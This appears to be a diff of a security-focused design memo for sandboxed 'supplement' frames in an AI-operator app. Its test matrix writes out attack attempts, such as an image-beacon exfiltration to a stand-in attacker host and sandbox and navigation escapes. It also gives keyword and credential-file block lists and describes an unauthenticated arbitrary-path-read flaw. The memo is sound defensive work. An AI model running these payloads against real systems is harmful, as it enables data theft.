+| U6 | Main-process guard | `src/main/index.ts` (main window, `:790-814`, `:969-1049`) | add a **stateful one-shot** `will-frame-navigate` guard on the supplement frame: allow exactly the first navigation per frame element (byte-for-byte vs the `data:` URL the host itself set at mount; armed once, disarmed after) and deny every later navigation regardless of URL — no `about:blank`/`about:srcdoc` allow, no URL/nonce pattern (round-1 S-R1/S-R4). `setWindowOpenHandler` keeps denying non-auth popups and gains an `http(s)` scheme gate before `shell.openExternal` (S-R11) |
+| U7 | CSP | `src/renderer/index.html:31-32` | `frame-src` stays as-is: `data:` is already allowed, and the list cannot shrink to `data:`-only — existing previews frame `blob:` (pdf-preview) and the backend origin (html-preview). The belt on this host is U6's stateful guard + the navigation counter (round-1 R1) |
 | U8 | Files | `utils/open-in-canvas.ts:92-152`, `link-toolkit.tsx:297-339`, `canvas-content.tsx:51-84` | reuse: Open in canvas / Reveal / Open in default app; type icon by `viewerFor(path)` |
 | U9 | Media op | `main/desktop-media.ts:67-97` | `sessions.supplementDocument` |
 | U10 | Settings | settings page | "Highlights" group |
@@ -794,7 +881,7 @@ Disposition: **C** = code in that lane's PR; **V** = verified (no code); **F** =
 | N2 | Row | `transcript-row.tsx:59-66,209-246`, `projection.ts:41-80` | `supplement` kind renderer |
 | N3 | Condensing | `turn-condensing.ts:123-129` | add `"supplement"` to `STATEMENT_KINDS` |
 | N4 | Frame | new `supplement-webview.tsx` | §4.1 native delivery |
-| N5 | Files | none today (no share/open, scout) | v1: name + size + "Preview" for text/image via the relay file route; "Share" via `expo-sharing` is a new dependency → **phase 2** |
+| N5 | Files | none today (no share/open, scout) | v1: name + size + "Preview" for text/image via the relay file route — bytes rendered **in-app from the fetched response**, never by navigating a browsing context to the route (round-1 S-R6); "Share" via `expo-sharing` is a new dependency → **phase 2** |
 | N6 | Contracts | `contracts/schemas.ts` (loose objects; open `EntryKind`) | schema for the entry and the event |
 
 ---
@@ -809,7 +896,19 @@ attacker's goals are:
   origin, `daemon.py:6636-6765`);
 - (b) exfiltrate conversation data over the network;
 - (c) navigate or phish the host;
-- (d) list or preview a secret file.
+- (d) list or preview a secret file;
+- (e) **execute code on the host through the file-callout UI** (round-1 S-R5: a file
+  affordance must never launch what it cannot vouch for);
+- (f) **spend money or consume vendor egress** by prompt-injecting the decision and
+  generator (round-1 S-R8 — the decision is a paid third-party call on every eligible turn).
+
+**Egress boundary (one statement; round-1 S-R8).** Every payload this feature sends to a
+vendor — the decision state, the option text, the evidence datasets, the steer text —
+passes `redaction_shapes.scrub_shapes` (`redaction_shapes.py:5112`) before it leaves the
+process, and the decision request is additionally **minimised**: file basenames, sizes and
+writing tools only — no relative directories, no file contents, no tool output, no absolute
+paths. What is withheld is stated where each payload is built (§2.3, §2.5), and the S-matrix
+inspects the request body at the data (§4.4 S17).
 
 ### 4.1 Delivery and isolation per surface
 
@@ -822,36 +921,70 @@ attacker's goals are:
   img-src data:; font-src data:; connect-src 'none'; frame-src 'none'; form-action 'none';
   base-uri 'none'` (`'unsafe-inline'` is safe here only *because* the origin is opaque and
   the network is closed);
-- the host accepts only `{lo:"supplement", v:1, t: "ready"|"resize"|"error"}` from
-  `event.source === frame.contentWindow`, validates the shape, and ignores everything else;
-- the host sends only `{lo:"supplement-host", t:"theme", mode, vars}`.
+- **the frame's own navigation is bounded per surface (round-1 R1/S-R1).** The sandbox and
+the document CSP do **not** cover it: `sandbox="allow-scripts"` lets a frame navigate
+*itself* (the sandboxed-navigation flag covers navigation of *other* contexts), and CSP
+governs subresources, not navigation (`navigate-to` is unimplemented in Chromium; the
+`<iframe csp>` attribute is unimplemented too and is not relied on). Per surface:
+**Electron** — a stateful one-shot `will-frame-navigate` guard (below); **native** — a
+one-shot `onShouldStartLoadWithRequest` rule (below); **relay web**, which has no
+interception point for a subframe navigation — a parent-page CSP `frame-src data:` plus a
+second-`load` teardown (below). Belt-and-braces on the desktop too: the guard is primary,
+and any frame whose navigation counter has moved has its messages dropped and is unmounted
+as hostile — a guard bug must not silently become an exfil path;
+- the host accepts only `{lo:"supplement", v:1, t: "ready"|"resize"|"error"}` shapes from
+  its own frame, and **every message that can move host state must carry the per-frame
+  nonce** the host minted and sent in the first theme push (`ready` is accepted without one:
+  the theme push has not been delivered yet and it moves nothing). `event.source ===
+  frame.contentWindow` identifies the *browsing context*, not the document — a navigated
+  frame keeps both `source` and `Origin: null` — so the nonce and the navigation counter are
+  the binding, alongside `event.origin === "null"` (round-1 S-R4). The nonce never appears
+  in the URL: a navigated document cannot read it from `location`, and a re-navigation to a
+  `data:` URL carrying the host's fragment is denied by the one-shot guard;
+- the host sends only `{lo:"supplement-host", t:"theme", mode, vars, nonce}`.
 
 | Surface | Delivery | Why this one (evidence) |
 |---|---|---|
-| **UI (Electron renderer)** | `<iframe sandbox="allow-scripts" src="data:text/html;base64,…#n=<nonce>">` (srcdoc rejected, see right). The html comes from `sessions.supplementDocument` via main (bearer added in main). | A `srcdoc` document *inherits the embedder's CSP* (CSP3 §"local schemes" inherit the source document's policies; scout cites w3c/webappsec-csp#700). The renderer's `script-src 'self' …` (UI `index.html:31-32`, verified) therefore **blocks the inline component script**. Options: (1) **blob: URL** — `frame-src` already allows `blob:` (verified), but per CSP3 a blob document also inherits the creator's policy, and Chromium currently takes the *navigation initiator's* (crbug 40053796), so the same block is likely; (2) **dedicated custom protocol** (`protocol.handle("lo-supplement")`, none exists, scout) served with its own CSP header — a real origin per document, a main-process change and `registerSchemesAsPrivileged`, and the heaviest; (3) **`data:` URL** — `frame-src data:` is allowed (verified); a data: document is opaque and per spec does *not* inherit the policy when navigated by URL. **Recommendation: data: URL in the sandboxed iframe, with the CSP meta inside.** Fallback if probe P1 shows inheritance: option 2. Size: ≤ 64 KB documents are fine as data: URLs. |
-| **Relay web** | `<iframe sandbox="allow-scripts" src="data:text/html;base64,…">` (same as UI), HTML fetched as JSON from the relay route. **Never** a relay-served `text/html` URL. | The relay has no CSP meta (`mobile/web/index.html` *(scout)*), so srcdoc would also work there. One delivery for both web hosts is chosen to keep the code path and the security probe single. An opaque origin sends `Origin: null`, which fails `cross_origin_mutation` (`daemon.py:4188-4205` *(scout)*) and the gateway's origin check (`gateway.py:583-595` *(scout)*). Tunnel header stripping is irrelevant because the CSP rides in-document (§2.7). |
-| **Native** | `react-native-webview` with `source={{html, baseUrl:"about:blank"}}`, `originWhitelist={["about:*"]}` (P4), `javaScriptEnabled`, `incognito`, `sharedCookiesEnabled={false}`, `thirdPartyCookiesEnabled={false}`, `allowFileAccess={false}`, `allowUniversalAccessFromFileURLs={false}`, `setSupportMultipleWindows={false}`, `onShouldStartLoadWithRequest` → allow only the initial `about:blank` load, deny all else, `onOpenWindow` deny, **no `injectedJavaScript`**. Theme is pushed with `postMessage(JSON)`. The prelude listens on both `window` and `document` `message` events (an Android quirk), and its outbound calls use `window.ReactNativeWebView.postMessage` when present. | There is no WebView today (`package.json:36-69` *(scout)*). The tunnel credential is set per-fetch by the app (`profile.ts:257-297` *(scout)*), so an incognito WebView holds no credential. Whether it shares the platform cookie jar on the custom route is probe P5; `incognito` + `sharedCookiesEnabled=false` is the belt either way. |
+| **UI (Electron renderer)** | `<iframe sandbox="allow-scripts" src="data:text/html;base64,…">` — the delivery **P1 decides** between (1) the `data:` URL, (2) a dedicated custom protocol, (3) `blob:`. The html comes from `sessions.supplementDocument` via main (bearer added in main); the CSP meta rides inside the document. | **Acceptance, settled at P1:** *the initial document loads AND the CSP is enforced* (the inline component script runs under the document's own policy; no embedder-policy inheritance surprise). The spec basis is contested — fetch's "is local" includes `data:`, whose policy-container step would inherit the initiator's CSP list, while Chromium has drifted by navigation method (crbug 40053796) — and the memo asserts neither reading. `srcdoc` inherits the renderer's `script-src 'self' …` (UI `index.html:31-32`) and is rejected. **Option 2's requirements are fixed now:** `registerSchemesAsPrivileged({scheme:"lo-supplement", privileges:{standard:true, secure:false, corsEnabled:false, bypassCSP:false}})`, its handler serves only stored digests with the §4.1 document policy as a response header + `X-Content-Type-Options: nosniff` + `Cache-Control: no-store`, and the frame keeps `sandbox="allow-scripts"` so the origin stays opaque either way. `secure:true` is the one to avoid: a secure context re-opens `RTCPeerConnection` (CSP does not govern WebRTC), `navigator.clipboard` and `crypto.subtle`. P1 records `window.isSecureContext` and `typeof RTCPeerConnection` for the winner — those are what decide whether the fallback is a downgrade (§9). Size: ≤ 64 KB documents are fine as data: URLs. |
+| **Relay web** | `<iframe sandbox="allow-scripts" src="data:text/html;base64,…">` (same as UI), HTML fetched as JSON from the relay route. **Never** a relay-served `text/html` URL. **Navigation control (this host has no interception point):** the relay page adds a parent-document CSP `frame-src data:` (the page frames nothing else today), so a navigation of the supplement frame to `http(s)` is blocked by CSP; and the host counts the frame's `load` events — the **second** `load` is a hostile navigation: tear the frame down, settle the job to `failed`, one debug line (round-1 R1/S-R1). | The relay has no CSP meta (`mobile/web/index.html`, verified: no CSP, no existing frames), so srcdoc would also work there. One delivery for both web hosts is chosen to keep the code path and the security probe single. An opaque origin sends `Origin: null`, which fails `cross_origin_mutation` (`daemon.py:4188-4205` *(scout)*) and the gateway's origin check (`gateway.py:583-595` *(scout)*). Tunnel header stripping is irrelevant because the CSP rides in-document (§2.7). |
+| **Native** | `react-native-webview` with `source={{html, baseUrl:"about:blank"}}`, `originWhitelist={["about:*"]}` (P4), `javaScriptEnabled`, `incognito`, `sharedCookiesEnabled={false}`, `thirdPartyCookiesEnabled={false}`, `allowFileAccess={false}`, `allowUniversalAccessFromFileURLs={false}`, `setSupportMultipleWindows={false}`, `onShouldStartLoadWithRequest` → **one-shot**: allow exactly the first request, deny everything after (not URL-matched — see below), `onOpenWindow` deny, **no `injectedJavaScript`**. Theme is pushed with `postMessage(JSON)`. The prelude listens on both `window` and `document` `message` events (an Android quirk), and its outbound calls use `window.ReactNativeWebView.postMessage` when present. | There is no WebView today (`package.json:36-69` *(scout)*). The tunnel credential is set per-fetch by the app (`profile.ts:257-297` *(scout)*), so an incognito WebView holds no credential. Whether it shares the platform cookie jar on the custom route is probe P5; `incognito` + `sharedCookiesEnabled=false` is the belt either way. |
 | **TUI** | HTML is never rendered. Image components only (none generated in v1, §8). | — |
 
 **Electron main-window hardening (UI lane, required before the UI frame ships):**
-- add `webContents.on("will-frame-navigate")` on the main window that `preventDefault()`s
-  any **subframe** navigation whose `frame !== mainFrame` and whose URL is not the `data:`
-  document the host itself set (match by a nonce in the data URL's fragment);
+- add `webContents.on("will-frame-navigate")` on the main window with a **stateful one-shot**
+  rule: allow exactly the FIRST subframe navigation per frame element — byte-for-byte against
+  the `data:` URL the host itself put in `src`, armed at mount and disarmed after — and
+  `preventDefault()` every later navigation regardless of URL. No `about:blank`/`about:srcdoc`
+  allow, no fragment/nonce match (a component can read `location.href` and re-navigate to a
+  `data:` URL carrying the same fragment; round-1 S-R4);
+- supplement frames mount in their own partition (`webPreferences.partition = "supplements"`;
+  no preload, no cache) with a **deny-by-default** `setPermissionRequestHandler` /
+  `setPermissionCheckHandler` — the main window's session installs none today and Electron
+  approves all permission requests by default; S11 asserts the handler's answer for each API
+  (round-1 S-R10);
 - there is no `will-navigate`/`will-frame-navigate` on the main window today (UI
   `src/main/index.ts`, verified by grep; only `browser/index.ts:980,1150` *(scout)*);
-- `setWindowOpenHandler` already routes non-auth URLs to `shell.openExternal` **and allows
-  that** (`index.ts:969-1049` *(scout)*). Without `allow-popups` the frame cannot call
-  `window.open`, but the handler is still tightened: deny any request whose `frame` is not
-  the main frame.
+- `setWindowOpenHandler` already denies non-auth popups — and hands the URL to the OS;
+  tighten it: deny any request whose `frame` is not the main frame, and allow only `http(s)`
+  to reach `shell.openExternal` (round-1 S-R11). This memo's sentence elsewhere — "denies
+  the popup and hands http(s) to the OS" — is the shape: never the URL as-is.
 
-**`HtmlPreview` is out of scope but is the same class of risk.** The canvas preview uses
-`sandbox="allow-scripts allow-same-origin allow-forms"` (UI
-`html-preview.tsx:107`, verified) on a `/v1/static/html?path=` document served from the
-backend origin (`server/routes/static.py:263-310`, no auth dependency visible on the route).
-A file on disk with script plus `allow-same-origin` runs with the backend origin's
-privileges. This memo does **not** fix it. It is recorded as a **separate security finding**
-for the operator (§8 F6) because supplements must not copy that sandbox, and a reviewer
-seeing the two side by side will ask.
+**`HtmlPreview` is out of scope but is the same class of risk — and now sharpened (round-1 S-R3).**
+The canvas preview uses `sandbox="allow-scripts allow-same-origin allow-forms"`
+(UI `html-preview.tsx:105-107`, verified) on a `/v1/static/html?path=` document served from
+the backend origin (`server/routes/static.py:264-310`). The route is **unauthenticated**: it
+sits in neither the managed boundary's sensitive prefixes (`/v1/auth/`, `/v1/settings`,
+`/v1/mcp`, `/v1/desktop/`) nor the legacy gate (`server/app.py:588` `_LEGACY_GATED_PREFIXES`,
+boundary `:697-712`), it `expanduser().resolve()`s the caller's `path` and gates only on an
+HTML mime family — i.e. **unauthenticated same-origin script execution with arbitrary-path
+reads**, reachable from any page the operator visits while the daemon is up (the CORS
+middleware echoes origins until the desktop allow-list installs), with `allow-forms`
+gratuitous on a preview. Fix: drop `allow-same-origin`/`allow-forms` (keep opaque, like the
+supplement frame), gate the route behind the desktop bearer and an allow-root, keep
+`nosniff`. This memo does **not** fix it: it is a **separate security finding**, and it
+should land as its own UI PR **immediately — this week** (§8 F6). The supplements escape
+round adds one row mounting the *preview* sandbox with the S1-S11 set, because it is the
+closest existing analogue.
 
 ### 4.2 Host-side validation (defence in depth, not the boundary)
 
@@ -864,11 +997,20 @@ checkable. `supplements/validate.py` rejects a component if:
   `EventSource`, `import(`, `importScripts`, `eval(`, `Function(`, `document.cookie`,
   `localStorage`, `sessionStorage`, `indexedDB`, `navigator.sendBeacon`, `window.open`,
   `top.`, `parent.` (only the prelude talks to `parent`), `location`;
+- it contains any of the WebRTC/worker-shaped strings named in round-1 review S-R9 —
+  `RTCPeerConnection`, `RTCDataChannel`, `WebTransport`, `SharedWorker`, `BroadcastChannel`,
+  `new Worker` — so the scan's coverage matches S11's consequences;
 - its `<data>` fails the provenance check (§2.10).
 
 A string scan can be evaded by obfuscation. That is accepted, because nothing it guards is
 reachable anyway under the sandbox and CSP. The security round (§4.4) attacks the sandbox,
 not the scanner.
+
+**Liveness controls (round-1 S-R12).** Two host-side rules keep a hostile frame from
+flooding or hanging the reader: the host accepts at most **one `resize`/`error` per frame
+per animation frame — latest-wins, the rest dropped** (the prelude already rAF-coalesces
+its own posts), and a **watchdog** armed at mount unmounts a frame that never posts `ready`,
+or that fails to answer a ping within 5 s, into the failed state (§2.8's fallback line).
 
 ### 4.3 The sensitive denylist (server-side, before the decision)
 
@@ -884,10 +1026,25 @@ composes the two existing lists instead of inventing a third:
 - `browser_files.py:480-512`: `CREDENTIAL_NAME_PATTERNS` (adds `id_ecdsa*`, `.git-credentials`,
   `.pgpass`, `.my.cnf`, `.dockercfg`, `credentials.json`, `service-account*.json`,
   `*.keychain*`, `*.jks`) and `CREDENTIAL_COMPONENTS` (adds `.azure`, `keychains`, `secrets`);
-- **plus**, for this feature: the config dir (`~/.local-operator/**`, which holds
-  `credentials.env`, `auth.db`), `*.sqlite`/`*.db`, `*token*`/`*secret*` basenames, and
-  `docker-compose*.y*ml`. That last one follows the operator's standing rule that some repos
-  keep env vars there.
+- **plus**, for this feature, all computed from live accessors (never a literal): everything
+  under `paths.config_dir()` (`paths.py:30,60` — a relocated `LOCAL_OPERATOR_CONFIG_DIR` must
+  be safe; it holds the secret store, `secrets/{store.db,master.key,audit.log}`,
+  `secrets/keys.py:67-90`) and the scratchpad root (`SCRATCHPAD_ENV`,
+  `tools/search_guard.py:214`); `*.sqlite`/`*.db`; `*token*`/`*secret*` basenames;
+  `docker-compose*.y*ml` (the operator's standing rule: some repos keep env vars there);
+  **and the credential classes the two composed lists miss** (round-1 S-R7):
+  `.config/gh` + `hosts.yml` **only** under it, `.docker` component and `config.json`
+  **only** under `.docker`, `.config/gcloud` + `application_default_credentials.json` and
+  `*_credentials.json`, `.terraform.d` + `*.tfrc.json`, `~/.terraformrc`,
+  `~/.config/rclone/rclone.conf`, `~/.s3cfg`, `~/.htpasswd`, `.netrc`/`_netrc`, the
+  aws/azure SSO caches (`~/.aws/sso/`, `~/.azure/`), and the browser cookie/credential
+  stores (the `keychains`/`secrets` components plus each platform's cookie store, at
+  implementation time).
+- **The S14 fixture is a table, not a sentence** (round-1 S-R7): for each name —
+  `.env.local`, `id_ed25519.pub`, `~/.aws/credentials`, `secrets/x.json`, `PROD.ENV`,
+  `.config/gh/hosts.yml`, `.docker/config.json`, `application_default_credentials.json`, a
+  symlink `report.md → ~/.ssh/id_rsa` — the expected `is_sensitive()` result **and the rule
+  id that produced it**; a denylist gap is only visible at the data.
 
 The predicate is evaluated on the **resolved** path (symlinks followed) **and** on the path
 as written. Either matching denies.
@@ -896,7 +1053,8 @@ as written. Either matching denies.
 
 The security round is a dedicated reviewer subagent, separate from code review, that runs
 **live** against a build of each surface. Each row is an actual attempt with a captured
-result. All must show "blocked".
+result. Rows marked "blocked" must show blocked; the egress, denylist and route rows assert
+what actually leaves or is served.
 
 | # | Attack | Surfaces |
 |---|---|---|
@@ -904,18 +1062,19 @@ result. All must show "blocked".
 | S2 | `fetch("http://127.0.0.1:1111/v1/desktop/sessions")` / `:8080` / relay `/api/sessions` | UI, relay, native |
 | S3 | `fetch("/api/sessions/<id>/command",{method:"POST",…})` (same-origin attempt) | relay |
 | S4 | `new Image().src="https://attacker/?d="+data`; CSS `background:url(https://…)`; `@import`; `<link rel=prefetch>`; DNS-prefetch | all |
-| S5 | `location="https://…"`, `top.location=…`, `<a target=_top>` click, `<meta refresh>` | all |
+| S5 | `location="https://…"` — the frame navigating **itself**. Blocked by the navigation guard per surface (Electron: stateful one-shot `will-frame-navigate`; native: one-shot deny; relay: parent CSP `frame-src data:` + second-`load` teardown). `top.location=…`, `<a target=_top>` click, `<meta refresh>`-to-top: blocked by the sandbox flags. The in-document CSP does not cover navigation — this row measures the guard, not the CSP (round-1 R1/S-R1) | all |
 | S6 | `window.open`, `<a target=_blank>`, `form.submit()` | all |
 | S7 | Remove the sandbox: `frameElement.removeAttribute("sandbox")`, nested `<iframe srcdoc>` with `allow-same-origin` | UI, relay |
-| S8 | Forged host message: the frame posts `{lo:"supplement-host",…}` to itself / to parent with a huge `h`, NaN, negative; message flood (10k/s) | all |
+| S8 | Forged host message: the frame posts `{lo:"supplement-host",…}` to itself / to parent with a huge `h`, NaN, negative; a **state-moving message without (or with a stale) nonce is dropped** (S-R4); message flood (10k/s) | all |
 | S9 | Theme vars injection: `vars:{"--lo-x":"red;}</style><script>"}` (host side is trusted, but verify the prelude's whitelist) | all |
 | S10 | `document.cookie`, `localStorage`, `indexedDB`, `caches` | all |
 | S11 | `navigator.clipboard`, `requestFullscreen`, `alert/confirm/prompt`, `print()`, download via `a[download]` | all |
-| S12 | CPU/memory DoS: `while(1){}`, 1 GB allocation → host stays responsive (a frame timeout/unmount after 5 s unresponsive on web: the Chromium OOPIF for an opaque-origin frame is probe P6) | UI, relay |
-| S13 | Native: `onShouldStartLoadWithRequest` bypass via `window.location`, `about:blank` re-navigation, `intent://`, `file:///` | native |
-| S14 | Denylist: a turn that writes `.env.local`, `id_ed25519.pub`, `~/.aws/credentials`, `secrets/x.json`, `PROD.ENV`, a symlink `report.md → ~/.ssh/id_rsa` → none listed, none sent to the vendor (inspect the decision request body) | core |
-| S15 | File route: `/supplements/<job>/file?i=<out of range>`, `?i=-1`, digest of another session, path traversal in the job id | relay |
+| S12 | CPU/memory DoS: `while(1){}`, 1 GB allocation, and a 10k messages/s flood with no ping answer → host stays responsive via per-frame coalescing + the 5 s watchdog (§4.2); the Chromium OOPIF for an opaque-origin frame is probe P6 | UI, relay |
+| S13 | Native: `onShouldStartLoadWithRequest` bypass via `window.location`, `about:blank` re-navigation, `intent://`, `file:///` — all denied by the one-shot rule; **plus: re-navigate to a `data:` URL that copies the host's fragment, then post `{t:"error"}` → no host state changes** (S-R4) | native |
+| S14 | Denylist, as the **table fixture** of §4.3 (each name + expected `is_sensitive()` + rule id); then a turn that writes them → none listed, none sent to the vendor (inspect the decision request body) | core |
+| S15 | File route: `/supplements/<job>/file?i=<out of range>`, `?i=-1`, digest of another session, path traversal in the job id; plus a `.txt` whose body begins `<!doctype html><script>…` → rendered as text, non-scriptable `Content-Type` + `nosniff` (S-R6) | relay |
 | S16 | Generated text containing a fake credential shape → `scrub_shapes` masks it in evidence | core |
+| S17 | Decision egress: a turn with a deliverable under `~/clients/<name>/…`; inspect the decision request body — basenames, sizes, writing tools, answer text only: no directories, no file contents, no tool output (round-1 S-R8) | core |
 
 ---
 
@@ -925,7 +1084,10 @@ result. All must show "blocked".
 
 - **Trigger matrix** (§2.2): one test per row of the case table, built on `_note_run_input`
   plus the provenance freeze. Includes "catch-up wake + user = eligible" and "user + courtesy
-  wake = not eligible".
+  wake = not eligible". Includes the R2 case: **a compacted, length-truncated turn that
+auto-continued** pre-filters over the accumulated logical-turn messages — the
+  pre-compaction tool results and file writes stay in input (assert against `RunProvenance`,
+  never the held end).
 - **Exec unchanged:** `lop exec` text and `--json` golden output byte-identical before/after
   on a turn that *would* qualify (scripted provider). No `supplement_progress` line on
   `--json`.
@@ -941,10 +1103,16 @@ result. All must show "blocked".
   `is_conversationally_active()` is unaffected.
 - **Sync:** `referenced_attachments_in` finds component digests in a journal with a
   `supplement_v1` row.
-- **Denylist:** the §4.4 S14 table as unit cases.
+- **Denylist:** the §4.4 S14 table as unit cases (name → expected result → rule id).
+- **`LO.fmt` mirror (round-1 D4):** the Python mirror matches the prelude's pinned vectors —
+  source-precision default; an explicit `digits` is the only rounding path.
+- **Host text (round-1 S-R2):** `display_text()` strips C0/C1 from names/titles/captions on
+  every surface; an OSC 8 link built from a name containing ESC/BEL/newline carries no
+  controls beyond the renderer's own.
 - **Settings:** `_consumer_defaults` entries; `test_every_default_matches_its_consumer`.
 - **Validator + honesty:** fabricated numbers rejected; derived columns accepted only when
-  recomputable.
+  recomputable; **rendered values** — the fmt-mirror check rejects a baked-in rounded string
+  (D4).
 
 ### 5.2 Golden set, spam rate and acceptance
 
@@ -992,7 +1160,7 @@ explicitly. A one-line opt-in for "files I edited" is not in v1.
 - **Decision arms:** Radient → TypeSafe → OpenRouter cascade (as shipped) vs. a warm-prefix
   session-model fork (ask-gate shape, measured on deepseek-flash and Sonnet). Metrics: the
   golden file and graphics precision/recall, $/eligible turn, p50/p90 latency.
-- **Generator arms:** run on the 14 graphics-positive goldens × 3 renders each:
+- **Generator arms:** run on the 8 graphics-positive goldens (§5.2) × 3 renders each:
   - Sonnet-class;
   - GPT mid-class;
   - Gemini Pro-class;
@@ -1009,7 +1177,8 @@ explicitly. A one-line opt-in for "files I edited" is not in v1.
   - decision ≈ $0.0001/eligible turn (the classification layer's documented range);
   - generator ≈ 9-15k input + 1-2.5k output tokens/job, so at Sonnet-class list prices
     ≈ $0.04-0.08/job.
-  - This is why `maxCostUsd` defaults to 0.05 and the open question Q1 exists.
+  - This is why `maxCostUsd` defaults to **0.20** — 2 × the $0.08 high end plus repair
+    headroom (round-1 R3) — and the open question Q1 exists.
 
 ### 5.4 QA matrix (qa-tester, per lane, real app)
 
@@ -1019,36 +1188,52 @@ QA uses an isolated config dir and synthetic ids, and every inherited `CMUX_*` i
 | Surface | Cases |
 |---|---|
 | Core/TUI | the trigger table end-to-end through a real runtime (`lop` with a scripted provider); exec `--json` and text unchanged (diff vs main); kill switch; settings off; cancel/steer/restart via slash commands; dispose mid-job; next-turn-during-job timing (event order); reaper exit mid-job; file links click-open; HTML silently absent; rendered SVG frames of the row in 3 states |
-| UI | the live job in 6 states; history reload; fold collapsed/expanded; 4 themes + a live switch mid-render (frames before/after); resize 320/600/900 px; files → canvas / reveal / OS app; mesh-session row ("on <peer>" disabled preview); the S-matrix subset |
+| UI | the live job in 6 states; history reload; fold collapsed/expanded; 4 themes + a live switch mid-render (frames before/after); resize 320/600/900 px **and a live drag 900→320; canvas-open→close (the 220 px floor)**; files → canvas / reveal / OS app; mesh-session row ("on <peer>" disabled preview); the S-matrix subset |
 | Relay web | the same states on a phone viewport; tunnel path; ended-session history shows components (the route does not 404 like `_entry_for_session`) |
 | Native | an iOS sim + Android emulator CI build; old-build compatibility (an unnegotiated viewer sees **no** row); condensing still collapses the turn |
 
 Visual evidence is required for every UI-bearing lane (AGENTS.md "Visual validation"). That
 means before/after frames, the brand themes plus 2 others, and a frame mid-theme-switch.
 
+**Added captures (round-1 design D9), per UI-bearing lane, in addition to the matrix above:**
+- loading (the reserved box, title as its label); empty (a done row renders nothing; files-only
+  reserves no frame space); error (the frame-level fallback line + the failed line); supersede
+  (the line disappears; no Retry);
+- populated extremes: 4 files + "N more" collapsed and expanded; 3 frames against the
+  `min(480px, 40vh)` budget; a ≥ 12-row table with the 320 px horizontal scroll; long paths
+  and long captions;
+- light/dark at the measured extremes (localOperatorLight + kanagawaLotus;
+  localOperatorDark + everforest) plus a frame mid-theme-switch — and an "OS preference
+  opposite the app theme" case per surface (round-1 D8);
+- narrow: 320 px and the 220 px canvas-open column, with a live drag (per D3); reduced motion /
+  no shimmer; the mesh row ("on <peer>", preview disabled); TUI copy parity (same fixed
+  strings, no hover affordances; files-only shows no reserved gap);
+- each series' values readable without hover, on a touch surface (round-1 D14).
+
 ---
 
 ## 6. Lane decomposition
 
-**The frozen contract** that lets lanes run in parallel is this memo's §2.4 row schema,
-§2.7 event, ops, routes and capability strings, and §2.6 document/`postMessage` contract.
-Lane C0 lands them **first, as code**:
+**The frozen contract** that lets lanes run in parallel is this memo's §2.4 row schema
+(and its stale-row reader rule), §2.7 event, ops, routes and capability strings, and §2.6
+document/`postMessage` contract. Lane C0 lands them **first, as code**:
 - the `SupplementProgressEvent` class;
 - the `supplement_v1` details TypedDict;
 - the route stubs answering 404;
 - the capability strings;
-- JSON fixtures in `tests/fixtures/supplements/` (rows, events, three assembled documents).
+- JSON fixtures in `tests/fixtures/supplements/` (rows — including the stale-row fixture
+  `state=queued, no live job`, and a superseded row — events, three assembled documents).
 
 Every other lane codes against those fixtures.
 
 | Lane | Repo | Scope | Consumes | Depends on | PR shape | Gates |
 |---|---|---|---|---|---|---|
 | **C0 contract** | core | event class, row TypedDict, capability strings, fixtures, route stubs, the prelude files + assembler (pure) | — | — | 1 PR, no behaviour | review + QA (fixture round-trip, `/v1/capabilities`) |
-| **C1 core engine** | core | §3.1 rows 1-14, 17, 22-23: provenance, trigger, runner, pre-filter, decision, generator, validator, persistence, ops, config, kill switch | C0 | C0 | 1 PR (large; split into C1a decision+files and C1b generator if > ~1.5k LOC) | review + QA (trigger matrix, exec diff, timing order) + **security round S2/S10/S13-S16** |
+| **C1 core engine** | core | §3.1 rows 1-14, 17, 22-23: provenance (incl. logical-turn accumulation, R2), trigger, runner, pre-filter, decision, generator, validator, persistence, ops, config, kill switch | C0 | C0 | 1 PR (large; split into C1a decision+files and C1b generator if > ~1.5k LOC) | review + QA (trigger matrix, exec diff, timing order) + **security round S2/S10/S13-S17** |
 | **C2 routes** | core | desktop document route (§3.1 row 15), relay document + file routes and ops (rows 19-20), mobile projection (row 18) | C0 | C0 | 1 PR | review + QA (curl matrix incl. unauthorised, wrong-session, unreferenced digest, denylisted file, ended session) + security S5/S8/S9/S11/S13 |
 | **T TUI** | core | §3.2 | C0 (+ C1 for live QA) | C0 | 1 PR | review + QA + **design** (SVG frames) |
 | **R relay web** | core (`mobile/web`) | §3.1 row 21: frame, theme push, files list, indicator | C0, C2 | C0 | 1 PR | review + QA + design + UX (cancel/steer/retry flow) + **security S1-S12 on relay** |
-| **U UI** | local-operator-ui | §3.3 | C0 fixtures | C0 merged (fixtures) | 2 PRs: **U-a** main-window hardening (U6, `will-frame-navigate`, popup handler) — ships first and alone; **U-b** row, frame, indicator, files, settings | review + QA + design + UX + **security S1-S12 on Electron** (U-a gets its own security round) |
+| **U UI** | local-operator-ui | §3.3 | C0 fixtures | C0 merged (fixtures) | 2 PRs: **U-a** main-window hardening (U6 one-shot guard, permission handlers, popup scheme gate) — ships first and alone; **U-b** row, frame, indicator, files, settings | review + QA + design + UX + **security S1-S12 on Electron** (U-a gets its own security round) |
 | **N native** | local-operator-mobile | §3.4 | C0, C2 | C2 merged (routes) | 1 PR + dependency note | review + QA (CI builds, sim/emulator) + design + UX + **security S1-S12 on WebView** |
 | **D docs** | core | `guides/highlights/GUIDE.md` (≤ 80 lines: what it is, on/off, cost, privacy, troubleshooting), `docs/DESKTOP_API.md` + mobile wire doc entries | C0 | C1 | 1 PR | review |
 | **Radient** | — | **none in v1** (§2.3) | — | — | — | — |
@@ -1059,8 +1244,10 @@ Every other lane codes against those fixtures.
 - D trails C1.
 - **The release order is enforced by capability negotiation, not by timing.** The runtime
   emits `supplement_progress` and projects `supplement` entries only to viewers that
-  negotiated `supplements-v1`, so an older UI or native build never sees an unknown kind.
-  The scout found that old native builds would otherwise paint unknown kinds visibly.
+  negotiated `supplements-v1` — the owner-record string ANDed with the viewer's own
+  auth-frame boolean (desktop live path: the route query param; §2.7) — so an older UI or
+  native build never sees an unknown kind. The scout found that old native builds would
+  otherwise paint unknown kinds visibly.
 - **Default-on is flipped in C1, but no viewer shows anything until its own lane ships.**
   - Files cost nothing.
   - Graphics spend money before any UI can render them. C1 therefore **keeps
@@ -1077,10 +1264,23 @@ reproductions. A UI or native lane **cannot merge** with any S-finding open at b
 
 ## 7. Risks and watch items
 
-- **CSP inheritance on Electron (P1).** If a `data:` frame inherits the renderer CSP, the
-  component script is blocked and the UI shows empty frames. The detector is the U-b QA
-  frame, plus the `ready` message never arriving (the host logs it). The fallback is a
-  custom protocol (§4.1 option 2), which costs about one more main-process PR.
